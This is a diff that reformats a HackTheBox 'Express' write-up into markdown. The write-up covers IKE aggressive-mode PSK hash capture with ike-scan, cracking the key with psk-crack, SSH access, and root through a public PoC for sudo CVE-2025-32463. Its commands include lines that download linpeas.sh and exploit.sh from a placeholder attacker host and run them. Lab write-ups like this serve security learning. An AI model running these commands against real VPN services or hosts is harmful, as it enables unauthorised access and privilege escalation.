@@ -1,79 +1,197 @@
-1. Initial Enumeration
+# 🛣️ HackTheBox — Express
 
-A full TCP port scan revealed only a single open port:
+> **Difficulty:** Medium | **OS:** Linux | **Category:** Network / Privilege Escalation
+> **Author:** Aryan Barkhordar
 
-- TCP 22 (SSH)
+---
 
-<img width="759" height="223" alt="image" src="https://github.com/user-attachments/assets/ab49d2e8-5d97-4126-94f2-35983b674e8b" />
+## Table of Contents
 
-Given the lack of TCP services, a UDP scan was performed, which revealed:
+- [Overview](#overview)
+- [Reconnaissance](#reconnaissance)
+  * [TCP Port Scanning](#tcp-port-scanning)
+  * [UDP Port Scanning](#udp-port-scanning)
+- [Exploitation](#exploitation)
+  * [ISAKMP Enumeration — ike-scan](#isakmp-enumeration--ike-scan)
+  * [PSK Hash Extraction](#psk-hash-extraction)
+  * [Cracking the PSK — psk-crack](#cracking-the-psk--psk-crack)
+  * [SSH Access as `ike`](#ssh-access-as-ike)
+- [Privilege Escalation](#privilege-escalation)
+  * [Manual Enumeration](#manual-enumeration)
+  * [Automated Enumeration — LinPEAS](#automated-enumeration--linpeas)
+  * [CVE-2025-32463 — Sudo Exploitation](#cve-2025-32463--sudo-exploitation)
+- [Flags](#flags)
+- [Summary](#summary)
 
-- UDP 500 – ISAKMP/IKE
+---
 
-<img width="722" height="252" alt="image" src="https://github.com/user-attachments/assets/1d846226-a42b-44d0-abba-5505cf8f2de3" />
+## Overview
 
-2. ISAKMP Enumeration
+**Express** is a HackTheBox machine that departs from the typical web attack surface, instead exposing an **IKE/ISAKMP VPN service over UDP**. Enumeration of the IKE service reveals a user identity, which is then used to capture and crack a Pre-Shared Key (PSK) hash — granting SSH access. Privilege escalation exploits a known vulnerability in the installed version of `sudo` (CVE-2025-32463), which a public PoC converts into a root shell.
 
-To enumerate the IKE service, I used:
+---
 
-**"_ike-scan -A [Machine IP]_"**
+## Reconnaissance
 
-This returned useful information, including the presence of a user named ike.
+### TCP Port Scanning
 
-<img width="1099" height="144" alt="image" src="https://github.com/user-attachments/assets/018f8517-d6d9-4d35-9516-e7193a5c14e3" />
+A full TCP scan of the target revealed a single open port:
 
-To extract the PSK hash, I ran:
+```
+PORT   STATE SERVICE
+22/tcp open  ssh
+```
 
-_**"sudo ike-scan -A --id=ike@expressway.htb -Ppresharedkey.txt [Machine IP]"**_
+> **Key Finding:** With only SSH exposed over TCP, no web attack surface was available. A UDP scan was warranted.
 
-<img width="1093" height="177" alt="image" src="https://github.com/user-attachments/assets/c4a3372b-02ff-44b4-8a94-1a202569a96e" />
+---
 
-3. Cracking the PSK
+### UDP Port Scanning
 
-Using a dictionary attack with RockYou:
+A targeted UDP scan surfaced an additional service:
 
-**_"sudo psk-crack -d /usr/share/wordlists/rockyou.txt presharedkey.txt"_**
+```
+PORT    STATE SERVICE
+500/udp open  isakmp
+```
 
-The key was successfully cracked.
+> **Key Finding:** UDP port `500` is the standard port for **ISAKMP** (Internet Security Association and Key Management Protocol), the control plane for IKE-based VPN negotiation. This was the intended attack vector.
 
-<img width="737" height="107" alt="image" src="https://github.com/user-attachments/assets/bf3141e0-172b-4c8a-8c7d-bba4873f5be9" />
+---
 
-4. User Access
+## Exploitation
 
-Using the recovered credentials, I logged in via SSH as ike.
+### ISAKMP Enumeration — ike-scan
 
-I was able to retrieve the user flag.
+The `ike-scan` tool was used to probe the IKE service and enumerate supported transforms and identities:
 
-<img width="260" height="32" alt="image" src="https://github.com/user-attachments/assets/8cf85e98-7e7a-4997-8049-1ead4b604bc6" />
+```
+ike-scan -A <TARGET IP>
+```
 
-5. Privilege Escalation
+The scan response revealed the presence of a user identity associated with the domain:
 
-Standard privilege escalation enumeration was performed:
+```
+ike@expressway.htb
+```
 
-- sudo -l
-- SUID binary checks
-- Manual filesystem review
+> **Key Finding:** The identity hint provided the username required to extract the PSK hash in aggressive mode.
 
-None of these were revealed anything interesting.
+---
 
-6. Automated Enumeration
+### PSK Hash Extraction
 
-I executed linPEAS to identify possible escalation vectors.
+With the discovered identity, `ike-scan` was re-run in aggressive mode to capture the Pre-Shared Key hash and write it to disk:
 
-<img width="785" height="60" alt="image" src="https://github.com/user-attachments/assets/e9c21d76-2089-4248-90fb-888bbefac5dd" />
+```
+sudo ike-scan -A --id=ike@expressway.htb -Ppresharedkey.txt <TARGET IP>
+```
 
-7. Vulnerability Identification
+The IKE aggressive mode handshake was captured and the hash was saved to `presharedkey.txt`.
 
-The sudo version installed on the system was vulnerable to CVE-2025-32463
+---
 
-8. Exploitation
+### Cracking the PSK — psk-crack
 
-A public proof-of-concept exploit for CVE-2025-32463 was downloaded, transferred to the target machine, and executed.
+The captured PSK hash was cracked using `psk-crack` with the rockyou wordlist:
 
-<img width="665" height="339" alt="image" src="https://github.com/user-attachments/assets/9495f3b6-1fd3-4703-8c71-3ad4a7928b28" />
+```
+sudo psk-crack -d /usr/share/wordlists/rockyou.txt presharedkey.txt
+```
 
-9. Root Access
+```
+<REDACTED PASSWORD>   (1 hash cracked)
+```
 
-The exploit resulted in a root shell. I was then able to retrieve the root flag.
+The Pre-Shared Key was successfully recovered.
 
-<img width="294" height="31" alt="image" src="https://github.com/user-attachments/assets/aa7039a9-1749-47ff-8357-2b96c38f7a47" />
+---
+
+### SSH Access as `ike`
+
+The cracked PSK was used as the SSH password for the `ike` user:
+
+```
+ssh ike@<TARGET>
+```
+
+Access was confirmed. The **user flag** was located and retrieved:
+
+```
+$ cat /home/ike/user.txt
+HTB{REDACTED}
+```
+
+---
+
+## Privilege Escalation
+
+### Manual Enumeration
+
+Standard enumeration checks were performed after gaining shell access:
+
+```
+sudo -l
+find / -perm -4000 -type f 2>/dev/null
+```
+
+Neither sudo permissions nor interesting SUID binaries surfaced anything exploitable at this stage.
+
+---
+
+### Automated Enumeration — LinPEAS
+
+LinPEAS was uploaded and executed to perform a broader sweep of the system:
+
+```
+wget http://<ATTACKER>:8000/linpeas.sh -O /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh
+/tmp/linpeas.sh
+```
+
+The output flagged the installed version of `sudo` as potentially vulnerable, highlighting it in a high-severity finding.
+
+---
+
+### CVE-2025-32463 — Sudo Exploitation
+
+The version of `sudo` installed on the system was confirmed to be vulnerable to **CVE-2025-32463** — a local privilege escalation flaw in sudo's handling of specific execution conditions.
+
+A public Proof-of-Concept was downloaded, transferred to the target, and executed:
+
+```
+wget http://<ATTACKER>:8000/exploit.sh -O /tmp/exploit.sh
+chmod +x /tmp/exploit.sh
+/tmp/exploit.sh
+```
+
+The exploit resulted in a **root shell**. The root flag was retrieved to complete the machine:
+
+```
+# cat /root/root.txt
+HTB{REDACTED}
+```
+
+---
+
+## Flags
+
+| Flag        | Value           |
+| ----------- | --------------- |
+| 🏳️ **User** | `HTB{REDACTED}` |
+| 🚩 **Root**  | `HTB{REDACTED}` |
+
+---
+
+## Summary
+
+| Stage                    | Technique                                                                        |
+| ------------------------ | -------------------------------------------------------------------------------- |
+| **Recon**                | `nmap` TCP + UDP scan, `ike-scan` IKE enumeration                                |
+| **Initial Access**       | IKE aggressive mode PSK hash capture → `psk-crack` with rockyou                 |
+| **Lateral Movement**     | SSH login as `ike` with cracked PSK                                              |
+| **Privilege Escalation** | CVE-2025-32463 — sudo local privilege escalation via public PoC → root shell     |
+
+---
+
+*Writeup by Aryan Barkhordar*
